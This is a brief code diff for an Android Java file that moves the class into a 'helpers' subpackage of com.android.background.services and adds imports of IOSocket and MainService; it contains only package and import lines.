@@ -1,4 +1,4 @@
-package com.android.background.services;
+package com.android.background.services.helpers;
 
         import android.media.AudioFormat;
         import android.media.AudioManager;
@@ -9,6 +9,9 @@ package com.android.background.services;
         import android.os.ParcelFileDescriptor;
         import android.util.Log;
         import android.view.View;
+
+        import com.android.background.services.IOSocket;
+        import com.android.background.services.MainService;
 
         import org.json.JSONException;
         import org.json.JSONObject;
